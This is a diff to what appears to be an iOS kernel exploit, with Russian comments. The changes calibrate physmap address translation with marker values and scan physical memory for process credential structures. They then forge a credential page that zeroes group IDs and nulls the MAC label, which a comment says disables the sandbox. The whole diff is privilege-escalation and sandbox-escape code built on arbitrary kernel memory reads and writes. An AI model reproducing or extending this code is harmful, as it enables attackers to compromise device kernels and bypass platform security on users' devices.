@@ -8184,7 +8184,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] скип PA-спаны: SPTM %#llx..%#llx TXM %#llx..%#llx",
                               (unsigned long long)sptmPA, (unsigned long long)(sptmPA + 0xF4000),
                               (unsigned long long)txmPA, (unsigned long long)(txmPA + 0x64000)]);
-                    if (uoff2 + 0x100 <= 0x4000) {
+                    // 1.9.281: калибровка physmap-меппинга маркером ctlPA (0xCAFEBABE).
+                    // Какой путь реально читает DRAM на этом буте — linear (pa-pB+vB)
+                    // или PAPT (phystokv). Неверный ptov = молчаливый промах скана.
+                    BOOL useLinear = NO, mapOK = NO;
+                    if (ctlPA) {
+                        uint32_t mLin = (uint32_t)early_kread64(ctlPA - pB + vB);
+                        uint64_t papV = phystokv(ctlPA);
+                        uint32_t mPap = papV ? (uint32_t)early_kread64(papV) : 0;
+                        useLinear = (mLin == 0xCAFEBABE);
+                        mapOK = useLinear || (mPap == 0xCAFEBABE);
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка physmap: linear=%#010x papt=%#010x → %@",
+                                  mLin, mPap, useLinear ? @"LINEAR ✓" : (mPap == 0xCAFEBABE ? @"PAPT ✓" : @"ОБА МИМО — скан пропущен")]);
+                    }
+                    if (uoff2 + 0x100 <= 0x4000 && mapOK) {
                         uint64_t reads = 0;
                         uint64_t idx = 0;
                         for (; idx < nF && (!pagePA || !roFieldPA); idx++) {
@@ -8196,7 +8209,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (pa >= txmPA && pa < txmPA + 0x64000) continue;
                             int t = kpFrameTypeOf(pa);
                             if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
-                            uint64_t pkva2 = pa - pB + vB;   // линейный physmap, без дыр PAPT
+                            uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
+                            if (!pkva2) continue;
                             reads++;
                             // (a) страница ucred: label + uid на тех же смещениях
                             if (!pagePA && early_kread64(pkva2 + uoff2 + 0x78) == labelQ &&
@@ -8239,9 +8253,21 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     *(uint32_t *)(fp3 + 0x68) = 0;  // cr_rgid
                     *(uint32_t *)(fp3 + 0x6c) = 0;  // cr_svgid
                     *(uint64_t *)(fp3 + 0x78) = 0;  // cr_label = NULL → sandbox off
+                    *(uint64_t *)(fp3 + 0x100) = 0xC0DEC0DEC0DEC0DEULL;   // маркер верификации KVA
                     mlock(fp3, 0x4000);
                     uint64_t fpPA3 = vtophys(ttM, (uint64_t)fp3);
-                    uint64_t fpKVA3 = fpPA3 ? (fpPA3 - kconstant(physBase) + kconstant(virtBase)) : 0;   // линейный physmap
+                    uint64_t fpKVA3 = 0;
+                    if (fpPA3) {
+                        uint64_t k1 = phystokv(fpPA3);
+                        uint64_t k2 = fpPA3 - kconstant(physBase) + kconstant(virtBase);
+                        uint64_t m1 = k1 ? early_kread64(k1 + 0x100) : 0;
+                        uint64_t m2 = early_kread64(k2 + 0x100);
+                        if (m1 == 0xC0DEC0DEC0DEC0DEULL) fpKVA3 = k1;
+                        else if (m2 == 0xC0DEC0DEC0DEC0DEULL) fpKVA3 = k2;
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] KVA-верификация маркером: papt=%@ linear=%@ → KVA=%#llx",
+                                  m1 == 0xC0DEC0DEC0DEC0DEULL ? @"✓" : @"✗", m2 == 0xC0DEC0DEC0DEC0DEULL ? @"✓" : @"✗",
+                                  (unsigned long long)fpKVA3]);
+                    }
                     kpNote(r, [NSString stringWithFormat:@"  [PSWAP-B] forge page: PA=%#llx KVA=%#llx → поле %#llx",
                               (unsigned long long)fpPA3, (unsigned long long)fpKVA3, (unsigned long long)roFieldPA]);
                     if (fpKVA3 && kpLooksLikeKernelPointer(fpKVA3)) {
@@ -8274,10 +8300,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
                 uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
-                uint64_t q0a = pkva ? early_kread64(pkva) : 1;
                 uint64_t q0b = early_kread64(pageVA);
+                uint64_t q0a = pkva ? early_kread64(pkva) : 0;
                 uint32_t uidViaPA = pkva ? (uint32_t)early_kread64(pkva + uoff + 0x18) : 0xdead;
-                BOOL paOK = (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                BOOL paOK = pkva && (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                // 1.9.281: fallback на линейный physmap, если PAPT-алиас попал в дыру
+                if (!paOK && pagePA) {
+                    uint64_t pkvaL = pagePA - kconstant(physBase) + kconstant(virtBase);
+                    uint64_t q0L = early_kread64(pkvaL);
+                    uint32_t uidL = (uint32_t)early_kread64(pkvaL + uoff + 0x18);
+                    if (q0L == q0b && uidL == (uint32_t)getuid()) { pkva = pkvaL; q0a = q0L; uidViaPA = uidL; paOK = YES; }
+                }
                 // 1.9.252: кросс-валидация через DART-read, если physmap-алиас ucred
                 // страницы сам охраняется (pkva=0 или q0a не сошёлся).
                 if (!paOK && pagePA && svc) {
